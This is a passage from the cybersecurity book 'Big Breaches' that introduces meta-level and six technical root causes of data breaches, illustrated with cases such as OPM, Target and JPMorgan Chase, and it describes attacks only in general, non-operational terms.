having the right board-level discussions, employing  the right technologies and processes, and making the right investments.   xlv   intRoduction  Finally, we provide guidance for those who are looking to join the battle  and enter the field of cybersecurity. The following is the detailed, chapter-  by- chapter breakdown:     Chapter 9 outlines seven habits that people need   to encode in their behavior to achieve security. The  chapter is analogous to Stephen Covey’s Seven Habits of  Highly Effective People except that it focuses on security  instead of personal development.     Chapters 10 and 11 provide advice to boards of  directors and executives about how to approach  board-level discussions on security. Included are  recommendations to create the right culture  based on  the habits in the previous chapter , engage the board to  tell a cohesive story around an organization’s security,  and then back up that story with both qualitative and  quantitative metrics.     Chapters 12 and 13 cover the options that organizations   can employ for technology  and process  defenses for  each of the technical root causes of breach.     Chapter 14 provides advice on how consumers can   defend themselves from the same root causes of  breaches that have been affecting organizations.     Chapter 15 analyzes where the $45 billion in private   equity and public IPO cybersecurity investments  over the past 15 years have been deployed, how  they correspond to the root causes of breach, and  recommends where future funding should be deployed  to mitigate data breaches.  xlvi   intRoduction     Chapter 16 provides advice on how to leverage one’s  skills to enter the field of cybersecurity, given that the  field is one of the fastest growing fields in the world,  and there are millions of job openings internationally.  At the heart of it, we need people to invest their intellect  and effort into achieving cybersecurity if we are to  create a world in which frequently occurring mega-  breaches are to become a thing of the past.  We hope and expect you will enjoy the journey through some of the   biggest data breaches of the past in the first part of this book and will  become part of the force to create a more digitally secure world armed  with the road map to recovery in the second part of this book! Join us!  xlvii   PART I  Big Breaches   CHAPTER 1  The Root Causes  of Data Breaches  What are the root causes that have allowed attackers to break into so  many organizations? This chapter mainly focuses on six technical root  causes. Before delving into those, we first discuss three of the “meta-level”  root causes: failure to prioritize security, failure to invest in security, and  failure to execute on security initiatives. For anything important in life or  business, one may argue that these three types of failures  to prioritize,  invest, and execute  can apply to almost anything, but we will cover some  of the specifics to security in this chapter.   Pragmatic Root Causes In our practice as security and technology professionals, we arrive at root  causes by asking “why” several times in postmortem meetings after things  go wrong. We have been trained to not stop after the first answer, even if it  is the easy and obvious one, but not thorough enough to get to the core of  the issue.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_1  3   Chapter 1    the root Causes of Data BreaChes  The Six Sigma system used by General Electric and other companies   proposes asking “why” five times, but one critical point of root cause  analysis is “knowing when to stop asking why.”1 If one asks why a breach  occurs enough times, say five, a “meta-level” root cause of security  not getting prioritized, invested in, or executed on sufficiently at an  organization may result. However, even in organizations where security  was generally getting some level of prioritization, on perhaps the third  or fourth why being asked, one might find a more technical root cause— for instance, an employee fell susceptible to a phishing attack, and  understanding the technical root causes can help organizations that  prioritize security put in place appropriate countermeasures.  If you ask why too many times, it may reveal a cause such as   “authentication was not designed into SMTP.”  SMTP stands for Simple Mail  Transfer Protocol and is one of the most basic protocols used for sending  email on the Internet.  However, redesigning the Internet is not practical,  and a cause at that level is not practically useful for most security leaders  or professionals in any organization. Hence, in our analysis of big breaches  and the 9,000 other reported breaches that have taken place over the past 15  years, we focus on asking why enough times to produce root causes that are  practical and useful that most organizations can do something about. With  that disclaimer, we now delve into our discussion of both meta-level root  causes and six technical root causes that are at the core of most breaches.   “Meta-Level” Root Causes: Prioritization,  Investment, and Execution In Chapter 6, we will learn in detail about the breach that occurred in  2015 at the US Government’s Office of Personnel Management  OPM ,   1 A. Vidyasagar, The Art of Root Cause Analysis, https:  asq.org quality- progress articles best-of-back-to-basics-the-art-of-root-cause-  analysis?id=7fb5c50d917d4bb8839230516f3e3e61  4   Chapter 1    the root Causes of Data BreaChes  the organization that holds the personnel records of a majority of US  government employees and contractors. The OPM’s 21.5 million personnel  records are made up of, in part, detailed SF-86 background check forms  used for national security positions. SF-86 forms, to start with, contain  social security numbers, names, addresses, places and dates of birth,  and employment history. They also contain intimate details about the  employee’s personal life, family members, college roommates, foreign  contacts, drug use, mental health and psychological information, and  adjudication information. Adjudication information encompasses a very  significant amount of extra vetting information for employees who need  access to classified information. The adjudication information includes  data on sexual behavior, some polygraph  “lie detector test”  examination  results, and any potential evidence of foreign influence.  Although some government agencies  e.g., the Central Intelligence  Agency  maintain their own personnel records, a foreign nation-state  that had possession of the OPM data could simply look at which people  stationed in their country were on file with the State Department and  deduce that a particular person was a CIA agent  and potentially a “spy”   by observing that a corresponding record was not present in the OPM  data set.  The stolen data also contained over five million fingerprints, and such  data could be used to potentially dupe biometric authentication systems.  Unlike password credentials, which can be changed if and when they are  stolen, people cannot change their fingerprints. Even if secret agents can  change their names, they cannot change their fingerprints. The stolen  fingerprint data can be useful to the attackers or to buyers of the data for  years.  The stolen records not only contained data about the individual  government employee but their family, their friends, and even their  neighbors. Although we leave the bulk of the case study of that breach to   5   Chapter 1    the root Causes of Data BreaChes  Chapter 6, one of the meta-level root causes was OPM’s failure to prioritize  its own security, as per the House Oversight Committee report that was  published after the breach:  Despite this high value information maintained by OPM, the  agency failed to prioritize cybersecurity and adequately secure  high value data.  The result was:  The  intelligence  and  counterintelligence  value  of  the  stolen  background  investigation  information  for  a  foreign  govern- ment cannot be overstated, nor will it ever be fully known.2  In more colloquial terms, the stolen data could potentially be used  to allow the attackers to identify US spies operating in a foreign nation-  state, monitor or track US spies operating internationally, or even be used  to attempt to mint spies of their own in our country by using the stolen  identity metadata to have their spies apply for government jobs in US  organizations.  In 2017, a Chinese national by the name of Yu Pingan suspected of   creating the malware used in part to conduct the OPM breach was arrested  by the FBI, and in 2018 National Security Advisor John Bolton confirmed  that the foreign nation-state suspected to have conducted the attack was  China:  You  may  recall  seeing  about  the  hacking  of  the  Office  of  Personnel Management by China, where potentially millions  of personnel records—my own included, and maybe some of  yours, from former government employees—has now found a  new residence in Beijing.3  2 The OPM Data Breach: How the Government Jeopardized Our National Security  for More than a Generation, Majority Staff Report, Committee on Oversight and  Government Reform, U.S. House of Representatives, 114th Congress. 3 www.fedsmith.com 2018 09 21 bolton-confirms-china-behind-opm-data-  breaches   6   Chapter 1    the root Causes of Data BreaChes  Chapter 6 covers in detail how a “meta-level” lack of prioritization  of security at OPM led to many technical root causes exploited by the  Chinese.  Once a goal is prioritized, a commensurate level of investment  can then be allocated to it. But the goal needs to be prioritized first.  Prioritization requires getting “buy-in” and agreement from stakeholders.  The top-level prioritization of initiatives at a company comes from its Chief  Executive Officer  CEO , with input from the company’s board of directors.  Company-level priorities may often include revenue goals, product and  feature launch commitments, and growth of active users or increased  number of customers. Security goals and initiatives can be complementary  to such goals, but may compete. A penetration test that is conducted  on a product in development before its launch may uncover a critical  vulnerability that may take some time to fix. If the launch of the product  was originally promised on a particular date, that date may need to be  delayed if it is to be launched free of vulnerabilities.  When it comes to prioritization of security, there may also be “bottom-   up” influence that may come from a Chief Information Officer  CIO ,  Chief Technology Officer  CTO , or Vice President of Engineering. Upon  asking for such prioritization from a bottom-up source, the CEO may  provide appropriate support, including funding. Any of the members of a  C-Suite  as well as a board of directors  may also be influenced by federal  regulation or by events that are taking place in the market landscape.  Irrespective of how security goals get prioritized, once prioritized, the goal  needs to be funded.  One of the first things that should be funded once the goal of security   is prioritized significantly enough within an organization is hiring an  information security leader, such as a Chief Information Security Officer   7   Chapter 1    the root Causes of Data BreaChes   CISO ,4 if one is not already employed by the organization. However,  simply hiring or having such an executive is not enough if the individual  is not set up or empowered to succeed. Funding may also be required  for an adequately sized information security team, tools and technology,  and other capital and operational expenditures  e.g., consultants or  contractors, a security operations center, etc.  to support the security team  and its goals.  We would also like to note that there are four different “types” of CISOs   and security teams, as per a research report led by Dr. Gary McGraw,  Sammy Migues, and Dr. Brian Chess, entitled the “CISO Report: Four CISO  tribes and where to find them.”5 In the report, an organization can view the  security team and its leader  1  as an enabler,  2  as a technology function,   3  as a compliance function, or  4  as a cost center.  Organizations that are most mature with regard to how they view   security have a CISO that is a seasoned senior executive, who may have a  deep technical past, but focuses their time on how good security can help  enable positive results for the business. Organizations that view security  as a technology function may have a CISO with solid business skills, but  is known primarily for their technical work. A technology-focused CISO  will often implement technical countermeasures to achieve security as  they continue along the path of becoming a more seasoned executive.  Organizations that view security as a compliance function often have  a CISO that is an excellent administrator and may not have a deeply  technical past. Finally, organizations that view security as a cost center   4 While we use CISO here, the security leader could be a CSO  Chief Security  Officer . One potential difference between a CSO and a CISO is that a CSO  typically is also responsible for physical security. For the purposes of the  discussion here, we use CISO and CSO interchangeably, as for most such security  leaders, the bulk of the time in their role is spent on information security. 5 CISO Report: Four CISO tribes and where to find them  Version 2.0 . Synopsys.  www.synopsys.com content dam synopsys sig-assets reports ciso-report. pdf  8   Chapter 1    the root Causes of Data BreaChes  have a security leader  who may or may not have the title of CISO  that  is primarily a technology person and may report into the information  technology department. Leading organizations typically view security as  an enabler or as a technology function and have a corresponding type of  CISO.  We’ll first cover some things that can be done to help best set up  a CISO for success for organizations that don’t just view security as a  compliance function or as a cost center. To start:    1   Have the CISO report to the CEO  at least “dotted   line” reporting if not solid line reporting . If an  organization truly believes that security is a top  priority, say just as high a priority as its finances,  its human resources, its technology, and so on,  then a CISO should report to a CEO just as a Chief  Financial Officer, a Chief Human Resources Officer   CHRO , or a Chief Technology Officer does.    2   Have the CISO present to the Audit Committee  or   ideally a separate cybersecurity-focused, board- level committee  at least once per quarter. The  Audit Committee is usually a subset of the board  of directors that receives reports on a company’s  financial audits. In the wake of the Enron scandal in  2001, the Sarbanes-Oxley  SOX  regulation requires  companies to have controls in place to ensure the  data integrity of financial reporting and accounting,  as well as audits of those controls. The role of the  Audit Committee typically broadened in most  companies after the creation of SOX regulations.  Although the Audit Committee is part of the  management structure that is tasked with reviewing  financial audits, a review of cybersecurity audits has   9   Chapter 1    the root Causes of Data BreaChes  also become a key part of the Audit Committee’s  purview. When the Audit Committee gets a view  into the state of an organization’s information  security program, it can have significant influence  on the CEO’s prioritization and the top-level  approval of budget to fund information security  initiatives. Hopefully, in the future, more companies  will adopt cybersecurity-specific board-level  committees to focus on the topic.    3   Have the CISO present to the entire board   of directors  typically a superset of the Audit  Committee or a cybersecurity-focused committee   at least once per year, if not more often as needed.  If a company is about to launch significant, new  products or services that may alter its security  exposure, is facing potential regulatory action, or  has recently had significant security incidents or  breaches, having the CISO spend more time with  the entire board of directors is likely warranted.    4   Give the CISO their own budget, team, and   decision-making authority. Some CISOs, especially  when the profession was younger, may only have  been “influencers” with a title but not budget or  decision-making authority. Such CISOs typically  had an uphill battle executing on security initiatives.  Beyond hiring a security executive, and setting them up to succeed  as mentioned earlier, we cover additional information regarding how a  typical information security team is organized in Chapter 16.  10   Chapter 1    the root Causes of Data BreaChes  How much should an organization invest in security, including   the security executive, their team, and additional tools and technology  support? The answer to that question is more art than science, but  there are data-driven ways to approach it. For instance, for any given  organization, look at how much similar types of organizations invest in  security. In 2019, as an example, financial services companies spent, on  average, 10% of their information technology budget on security, as per  data from Deloitte & Touche.6  Of course, if the average organization is getting breached, and  an organization is only spending the same amount as the average  organization in a particular sector, chances are that organization is going  to get breached as well. So, while statistics from firms such as Deloitte  & Touche can be used as a benchmark, one might consider spending  more  or even significantly more  than the averages if one wants to be  more secure than their peers and or have a shot at not getting breached  as easily. That said, simply spending more may not achieve the goal of  lowering the probability of breach if the money is not getting spent in  the right areas. Focusing spending on addressing root causes of breaches  is likely worthwhile in helping lower the probability of a breach. Every  organization, though, is unique, and understanding what is the level of  maturity of different aspects of its information security program is a good  precursor to determining where further spending is likely to make the  biggest difference. Once a baseline understanding of a program’s maturity  level is done along areas such as governance, application security,  operations, and incident management is done, then gaps or additional  capabilities needed can be identified, and further investment can be made  to address those gaps or additional capabilities needed.  6 Reshaping the cybersecurity landscape, Deloitte & Touche, 2019.   www2.deloitte.com us en insights industry financial-services  cybersecurity-maturity-financial-institutions-cyber-risk.html  11   Chapter 1    the root Causes of Data BreaChes  What particular areas and functions of a business may require   investment to achieve better security? That depends on, as covered in the  Introduction, what an organization’s crown jewels are, what it is trying to  protect the most, and what is the organization’s current level of maturity  with regard to protecting against those threats, among other factors.  One can look at how much revenue a company earns, what is its   valuation, and what is the risk posed to the organization due to information  security threats and make a back-of-the-envelope calculation as to how much  should potentially be spent on security. Once security has been prioritized  and been allocated enough investment, it is then a matter of execution.  Execution in the area of security bears enough similarity to execution   in other areas, though, that we will not spend much time discussing it.  Execution on security initiatives may typically involve a significant amount  of cross-functional effort. Depending upon the initiative, the CISO’s team  will have to partner very closely with the CIO’s team, legal, and program  management, among other departments. The CISO’s team may typically  comprise of mostly experts in different aspects of information security and  may need to significantly influence other teams to get work done toward  achieving security goals.  The CISO’s team may or may not directly have the tactical horsepower   that is required to actually do all the execution on any particular project.  One analogy to keep in mind may be to think of the CISO’s team as the Jedi  from Star Wars. There are relatively few of them in number, and while they  may have deep mastery of their art  or religion , they can only help lead the  clone army and other disciplines in battle. There are typically not enough  Jedi or security professionals to actually fight all the battles themselves.   Technical Root Causes Many breaches occur because security has not been prioritized, invested  in enough, or correctly executed. That said, such are “meta-level” reasons  that a breach can occur. When an actual breach occurs, there are usually   12   Chapter 1    the root Causes of Data BreaChes  one or more technical root causes, and we will now turn our attention to  those important root causes next.  From an analysis that we have conducted of the dozens of mega- breaches   that have taken place at such companies as Target, JPMorgan Chase, Yahoo,  Facebook, Anthem, and many others, as well as the thousands of smaller  breaches that have taken place, there are six technical root causes that are  responsible. One or more of them are typically behind almost every breach.  The root causes are:7    1.  Unencrypted data    2.  Phishing    3.  Malware    4.  Third-party compromise or abuse    5.  Software vulnerabilities, and    6.   Inadvertent employee mistakes.  Although CISOs may have a multitude of compliance standards     e.g., PCI, HIPAA, ISO 2700x, NIST 800-53, HITRUST, FedRAMP , security  frameworks, and regulations to comply with, we would encourage CISOs  to focus on mitigating the risks due to these technical root causes as  they significantly reduce their risk of breach. Standards frameworks, and  regulations often contain the kitchen sink and are developed and designed  by committee. Rather, once a security program is prioritized, invested in,  and ready to be executed on, focus on increasing a program’s maturity in  mitigating the six technical root causes of breach will go a long way and  can also help achieve compliance in many critical areas as a side effect.  7 For the advanced reader, note that these root causes are not parallel concepts in  the sense that, for example, phishing is an attack while unencrypted data is about  lack of a security control  encryption  being employed.  However, we focus on  these root causes to keep the list short, practical, and easy to understand even if  they are not conceptually parallel.  13   Chapter 1    the root Causes of Data BreaChes  Organizations such as the Identity Theft Resource Center  ITRC  and   PrivacyRights.Org maintain an inventory of every breach in the United  States that was publicly reported. Table 1-1 shows a summary of which  technical root causes were responsible for which breach types, as used in  PrivacyRights.Org’s inventory, and also lists examples of mega-hacks that  occurred due to the corresponding technical root cause. As mentioned  already, we will be covering the details of many of these mega-hacks in  upcoming chapters.  Table 1-1.  Correspondence Between Technical Root Causes of Breach  and PrivacyRights.Org Breach Type Categorization  Technical Root Cause  Breach Types  and Example Mega-Hacks   unencrypted data  phishing and malware  third-party compromise or abuse  software security  physical losses and portable devices  hacking compromise by outside party  e.g., target, JpMorgan Chase, opM, anthem,  Yahoo, DNC, Marriott, WannaCry   hacking compromise by outside party  e.g., target, JpMorgan Chase, facebook,  Marriott   hacking compromise by outside party  e.g., equifax, Yahoo, facebook   Inadvertent employee errors  accidents  separate from phishing   unintended disclosures  e.g., exactis, river City Media   To understand how many breaches occur due to these root causes,   we can look at data from PrivacyRights.Org as per Figure 1-1. As per  their categorization, the top causes of breach, in most prevalent to least  prevalent order, are due to hacking or malware, unintended information  disclosure, physical loss, portable devices, and so on. Note that while their  categorization does not map exactly to the six technical root causes we   14   Chapter 1    the root Causes of Data BreaChes  have outlined, we can understand the correspondence between the causes  of breach in Figure 1-1 and our six technical root causes from Table 1-1.  Figure 1-1.  Causes of breach  Although it may seem that hacking or malware is the most prevalent   cause of breach from the highest bar in Figure 1-1, the number of breaches  due to physical loss and portable devices combined actually exceeds those  due to any other cause  including hacking or malware .   Unencrypted Data By simply eliminating all unencrypted data, the overwhelming majority of the  breaches due to physical loss and portable devices can be avoided. As such,  unencrypted data is, in fact, the most prevalent root cause of data breaches.  As per data breach laws in the United States, when personally identifiable  information is stolen, but is encrypted, there is no breach because the stolen  information is worthless  assuming the encryption keys are also not stolen .  15   Chapter 1    the root Causes of Data BreaChes  Sensitive data  e.g., personally identifiable information, or PII  should   ideally be encrypted, if possible. Encryption is a way of mathematically  encoding data using cryptographic algorithms such that anyone who does  not possess the decryption key cannot decode the data.  Many data breaches occur because sensitive data has not been   encrypted. Data that is not encrypted is informally said to be “in the clear”  and is referred to as “cleartext” or “plaintext” from a technical perspective.  Once sensitive data has been encrypted and is in “ciphertext” form, it is  indistinguishable from gibberish.  When sensitive data is not encrypted, attackers are able to view it and   read it just as plainly as one can read this sentence. Hence, encrypting  data  and also securely protecting the encryption keys  is a very important  technical countermeasure that can prevent many data breaches from  occurring. Even if an attacker is able to break into an organization’s  network or even steal hard drives  whether from a laptop or data center ,  there is no breach if the only data that they can get access to is encrypted.  As such, unencrypted data is an important root cause of many breaches.  When a CISO first joins an organization  that has never perhaps  had a CISO before , an immediate goal should be to find all sensitive  unencrypted data and get it encrypted immediately to reduce risk due to  this important technical root cause.  After unencrypted data, the next most prevalent root causes of   breaches are phishing and malware.   Phishing Phishing is an attack in which miscreants send out emails claiming to, say,  be from a bank and encourage users to log in to an impostor bank website.  The attacker’s goal is to have the user log in to the impostor bank website  with their actual credentials. Behind the scenes, the attacker would then  use the credentials to log in to the actual bank website and transfer money  out of the user’s account.  16   Chapter 1    the root Causes of Data BreaChes  Especially once email applications supported messages in HyperText   Markup Language  HTML  format, attackers could create links in email  messages where the highlighted and or underlined link text could say  a bank’s name, but the underlying link would be to an impostor bank  website instead of the actual bank’s website. The impostor bank website  would use the same graphics and logos as the actual bank’s website. Some  “encouragement” in the email would usually include an urgent call-to-  action claiming, for instance, that there was a problem with the user’s  account, and their account might be shut down or some other negative  repercussion would occur if the user did not act right away.  In the early days of phishing, attackers would have to guess which bank   the user might have an account, and phishing attempts would usually  target a broad spectrum of user email addresses claiming to be from  popular banks, hoping that many users may actually have accounts at the  purported bank.  Phishing attacks became more sophisticated over time in which  attackers would not just email users in bulk hoping they did business  with a particular bank. For instance, an attacker could obtain a list of  email addresses of users that actually are customers of a particular  bank and then target those users with phishing emails. The attacker’s  “conversion rate,” or the percentage of users that would actually get tricked  into submitting their credentials to the impostor bank website, would  be significantly higher since the attacker knows the users are actually  customers of a particular bank. Such was exactly the concern in the  aftermath of the 2014 JPMorgan Chase breach in which the names and  email addresses of over 70 million customers were stolen. We will cover  how that particular breach occurred in Chapter 8.  Even more focused phishing attacks were conducted over time in   which a mission-based attacker who was targeting a particular enterprise  may leverage a professional social media networking site such as LinkedIn  to research particular employees who may work at a specific company.  Although such social media sites may not disclose any particular   17   Chapter 1    the root Causes of Data BreaChes  user’s email address, the attacker would also research the conventions  that company might use for email addresses for their employees  e.g.,  firstname.lastname@company.com . Then the attacker can send phishing  emails to the corresponding email address and use an impostor website  that appears to be that company’s Intranet website to harvest corporate  account credentials.  If attackers from their research determine that a company uses a  particular hosted email system  e.g., Microsoft , they may set up an  impostor web page that looks like that company’s hosted Microsoft  Outlook page. Once harvested, the attacker would use the credential to  log in to the corporate email system, and potentially steal intellectual  property, trade secrets, or other data, either by directly siphoning out of the  compromised user’s inbox or duping other employees to send over such  information.  These targeted phishing attacks are often referred to as spear phishing   attacks and are used by attackers in an alarmingly large number of  breaches as a point of initial compromise.  In another example from 2016, Hillary Clinton’s presidential campaign   was breached due to a spear phishing attack by the Russians in which  John Podesta  campaign manager  inadvertently supplied his Google  Apps email username and password, resulting in a theft of over 60,000  Democratic National Committee emails.  One of the reasons that phishing attacks are so easy to conduct is that   the original Internet email protocol  i.e., Simple Mail Transfer Protocol,  SMTP  did not contain any features to support authentication or security  more generally. SMTP was developed when the ARPANET  the predecessor  to the Internet  was comprised of a network of about a dozen universities  and military institutions that all trusted each other. Anyone could send an  email to anyone else claiming to be whoever they wanted to be.  Today, more advanced email protocols such as DKIM and DMARC   allow organizations to digitally sign emails on behalf of the sending  organization. Hence, when those protocols are in use, it becomes   18   Chapter 1    the root Causes of Data BreaChes  virtually impossible for a phisher to send an email claiming to be from,  say, google.com. However, even with the use of such more advanced  email security protocols, phishers can spoof similar domain names such  as g00gle.com. As such, organizations need to register many dozens or  hundreds of domains that are similar to their domain name to prevent  phishers from being able to use them.  Even as recently as 2021, phishing is leveraged as a prominent attack   technique. Deploying basic anti-phishing countermeasures, such as  enabling the use of two-factor authentication, encouraging the use of  password managers, or even using mobile phones or hardware tokens for  second-factor authentication would prevent these breaches. We will cover  not only these basic countermeasures but also more advanced ones to  mitigate phishing attacks in the second half of this book.   Malware Malware is short for malicious software. It is typically written by attackers  who have malicious intent, at least with respect to the defenders or victims.  Just as good software can be used by people to automate tasks or increase  productivity, malicious software can be written to steal money, disrupt  power grids, or even change votes recorded by voting machines.  There are many types of malicious software, including viruses, worms,  rootkits, keyloggers, and ransomware. Each of these types of malware has  different goals and characteristics. Viruses are programs that are capable of  copying themselves into other programs. Although viruses typically need to  be running in one process or program on a host machine in order to replicate  into another process or program, a worm can self-replicate to another  machine even though there is no infected component running on the other  machine. Rootkits are malware that infect the system at the operating system  level and are not easily detectable as they replace any operating system  commands that could otherwise report any system anomaly due to the  presence of the malware. Keyloggers record each and every keystroke made   19   Chapter 1    the root Causes of Data BreaChes  on a system, including the recording of passwords and chat conversations.  Ransomware encrypts files so that the legitimate owners of a file cannot read  it and then asks the legitimate owner to pay a ransom for the decryption key.  Although many may be familiar with viruses that could perhaps   propagate from an unfamiliar USB stick to a machine into which the USB  stick is inserted  which is how Stuxnet initially infected machines in a  nuclear plant in Iran , many may not be as familiar with malware drive-  by- downloads. Malware propagation via drive-by-downloads started in  the mid-2000s and is a form of propagation in which malware can infect  a machine simply when a web page is viewed. That is, no clicking is  required on the web page, no attachment needs to be opened, and no user  interaction is required for a machine to get infected. Simply viewing a web  page is enough to infect the machine that is viewing the web page within a  few hundred milliseconds.  One might wonder how simply viewing a web page can result in a   machine getting infected. Surely, by comparison, it is very counterintuitive  that a human could get infected simply by, say, reading a physical book.  There are, of course, rare cases in which a book laced with powder can  spread Anthrax, a serious bacterial disease that can cause pneumonia and  potentially death. That said, such cases are quite rare in the physical world.  However, malware drive-by-downloads are used very often to propagate  malware on the Internet.  The big change that started to occur circa the mid-2000s is that web pages  were no longer just written in HTML, in which the pages specified formatting  information for machines to display or render those pages. Interactivity with  web pages was designed to happen through a technology called Java Applets  that was invented by Sun Microsystems and Netscape, the companies that  made the first commercial web servers and web browsers. Java Applets would  allow for dancing pig images to be controlled by user input on a web page  and many other forms of more productive interactivity. Applets attempted  to do so in a “safe” manner by running potentially untrusted code from a  server in a “sandbox” in the user’s browser. Implementing a totally secure   20   Chapter 1    the root Causes of Data BreaChes  sandbox proved to be challenging, and security researchers were able to  show that it was possible for Java Applets to escape the sandbox.8 Even  more unfortunately, the demand for more features and more interactivity  resulted in the JavaScript programming language  a language distinct from  Java . JavaScript received much more adoption than Java itself for web page  interactivity support. Even more unfortunate is that JavaScript code run  within browsers was not as well sandboxed as Java Applets and as such  allowed miscreants to write malware that breaks out of web pages and runs  on the actual machine itself instead of just in a sandbox in the browser.  The technical details of how JavaScript has been leveraged to spread  malware are interesting. Without getting into the bits and bytes, though,  miscreants are able to write code in JavaScript that could query a browser to  determine which plug-ins are installed. Plug-ins such as Adobe Flash, the  Adobe PDF reader, and so on have many vulnerabilities, so the miscreant’s  JavaScript code could, within just a few hundred milliseconds, not only  query which browser plug-ins were running but what their vulnerabilities  are. Then the miscreant’s JavaScript code would simply send the browser a  tailored piece of “shellcode” to take over the browser and then potentially  the entire machine.9 Such drive-by-downloads infect machines with no user  interaction required—simply a brief view of a web page. In essence, web  pages evolved from being written in HTML to being highly interactive with  large portions of pages being written in JavaScript, and as such, web pages  could also be used to then propagate malware much more easily.  Drive-by-download malware is also used in many attacks as part of   spear phishing campaigns. Although most traditional spear phishing  campaigns had the goal of luring the user to an impostor web page   8 Gary McGraw and Edward Felten, Java Security  Wiley, 1996 . 9 “Shellcode” was called as such because attackers would often leverage such  types of vulnerabilities to give them access to a “command shell”—a program  that would let them issue commands of their choice without authentication or  authorization on the compromised machine. The code that the attacker sends to  give them access to a command shell is the “shellcode.”  21   Chapter 1    the root Causes of Data BreaChes  with the hope of harvesting the user’s credentials for the corresponding  legitimate web page, attackers have sent spear phishing campaigns with  malware drive-by-download links. When victims click the malware drive-  by- download links, their machines are infected almost immediately when  the corresponding web page loads.  The attackers no longer had a need to try to harvest the user’s credentials  on an impostor web page. Instead, the user’s machine could be infected with  a keylogger that gathers the user’s password credentials for any and every  website that the user naturally visits at any time after the infection by the drive- by-download and keylogger. Drive-by-download malware has played a key  role in many high-profile hacks including Aurora in 2009 and Target in 2013. For breaches that are due to hacking or malware, they can be prevented   by deploying a host of countermeasures, including phishing awareness  training, two-factor authentication, isolation technology, anti- virus  endpoint protection, and so on. Such countermeasures have varying  levels of effectiveness, and each has their own trade-offs. We discuss such  countermeasures as well as next-generation countermeasures that can help  secure an organization’s cybersecurity posture in the second half of this book.   Third-Party Compromise or Abuse Often, an organization gets compromised not because the attackers target  the organization directly, but rather because of one of the third parties with  which the organization works, as occurred in the case of the SolarWinds  hack discovered in December 2020. In that hack, approximately 18,000  organizations were affected due to their use of a particular version  of SolarWinds’ Orion product.10 Both commercial companies and  government agencies, for instance, have many hundreds or thousands  of suppliers depending upon their size and what they do. The larger an   10 A free online book chapter on the SolarWinds hack is available on this book’s   website at www.bigbreaches.com.  22   Chapter 1    the root Causes of Data BreaChes  organization, the more investment it may have put into its own security.  The smaller an organization, the less investment might have been put into  security given limited financial resources and competing priorities. In a  large organization that has invested much into its own security, but that  relies on many smaller suppliers, the more likely it may be that an attacker  can break into one of the smaller suppliers to make an initial compromise  instead of breaking into the larger organization directly.  In events leading up to the Target breach in 2013, the initial   compromise took place when network credentials were stolen from Fazio  Mechanical Services, an HVAC  a heating, ventilation, and air conditioning   supplier that was responsible for controlling the temperature in Target’s  retail stores. We discuss the Target breach in much more detail in Chapter 8.  Similarly, in the JPMorgan Chase breach in 2014, a security   vulnerability  lack of two-factor authentication  at a third party by the  name of Simmco Data Systems, a company that was responsible for  organizing charitable marathon races on behalf of JPMorgan Chase, was  exploited as a part of the attack. We discuss the JPMorgan Chase breach in  much more detail in Chapter 8.  As the mega-breaches at Target and JPMorgan Chase illustrate, when a   large organization works with smaller suppliers, it is important for the larger  organization to bring the security countermeasures and defenses used by  its suppliers up to par with its own. In the field of security, it is said that a  system can only be as secure as its weakest link, and if that weak link is due  to a trusted supplier, then that link probably needs to be strengthened.  Third-party supplier compromises are not the only third-party type  of issue that can result in major hacks. For instance, in 2018, Cambridge  Analytica, a third-party application developer, abused Facebook’s API to  harvest social media profile information of 50 million users. We cover the  Cambridge Analytica hack in detail in Chapter 5.  In another example, in the Dun & Bradstreet  D&B  hack of 2017, a  database of 33 million records of government and corporate employee  contacts was stolen and exposed. D&B, as part of their business model and   23   Chapter 1    the root Causes of Data BreaChes  how they generate revenue, sold the records to some of their customers.  Although a breach likely did not occur at D&B itself, it was a case in which  one of its third parties had a breach. For D&B, every customer to which it  sold its database is a third party. Of course, as it was quite apparent that the  original source of the stolen data was D&B, D&B’s brand took the hit for  the breach, even though it was one of their customers that got breached. If you are in a business in which you sell data to your customers, you   need to vet not only your suppliers and partners but your customers as  well as your company will incur the reputational damage if one of the  customers that holds your data gets breached.  Yet another type of third party is a smaller company that a larger   company acquires. In the case of the Marriott breach in 2018 in which  over 300 million records and over 5 million passport numbers were stolen,  attackers compromised Starwood which was acquired by Marriott. We will  cover the Marriott breach in more detail in Chapter 3.  Prior to an acquisition, the potential acquiree is a third party, and   post the acquisition the acquired company becomes a first party. If you  acquire a breached company, you are breached as well. If you operate an  information security program that has a sub-team responsible for third-  party vetting, potential acquisitions should also be vetted prior to the  acquisition taking place, just as a potential supplier should be vetted prior  to becoming a customer of that supplier. Although companies need to be  very secretive about other companies that they are considering acquiring  for a variety of reasons, it is important to loop in the information security  team to help vet the security of potential acquisitions to avoid getting  breached through an acquisition.  Hence, there are many types of third parties  suppliers, partners,   customers, and potential acquisitions  that are important to vet from a  security perspective, as a compromise or breach can occur due to any of  them.  24   Chapter 1    the root Causes of Data BreaChes   Software Security The modern world runs on software. High-tech companies such as  Facebook, Amazon, Apple, Netflix, Google, and banks such as Capital One  and JPMorgan Chase rely on software that they develop themselves to  provide the products and services that generate the bulk of their revenue.  Vulnerabilities in the software that they develop can be leveraged by  attackers to steal data or wreak havoc in many other types of ways.  A single vulnerability can be used by attackers to breach an   organization. For instance, even as early as 2004, a credit card payment  processor by the name of CardSystems had a “SQL Injection” vulnerability  which resulted in the exposure of more than 40 million credit card  numbers. In essence, someone at CardSystems connected a database of  more than 40 million unencrypted credit card numbers to their website   they were previously unconnected , and the vulnerability would let  anyone on the Internet issue commands of their choice to the database.  The attackers set up a script of commands that would exfiltrate thousands  of credit card numbers per day, until the breach was discovered, at which  point all 40 million plus credit card numbers had to be changed.  However, sometimes multiple vulnerabilities have to be exploited   together as in the Facebook breach in 2018 in which 30 million user  access tokens were stolen due to a combination of three distinct software  vulnerabilities. The access tokens in that breach allowed attackers to get  into all 30 million of the accounts. We cover the 2018 Facebook breach in  more detail in Chapter 5.  In addition to such first-party software vulnerabilities in software they   develop themselves, businesses have to deal with third-party software  vulnerabilities as their businesses rely on third-party software also. Some  examples include:  25   Chapter 1    the root Causes of Data BreaChes     Application software packages on clients, servers, or  mobile phones that need to be “patched” periodically     Software for any on-premise hardware used ranging  from Internet routers to Internet-connected security  cameras     Third-party software used to support the development   of their first-party software     Vulnerabilities in “SaaS”  software-as-a-service    services  As you are probably well aware, software is not perfect by any means   and typically contains defects—either software implementation “bugs”  or design flaws that cause it to not function correctly in certain cases.  Some defects can be a source of security vulnerabilities. Such defects  can, in some of the worst cases, allow an attacker to 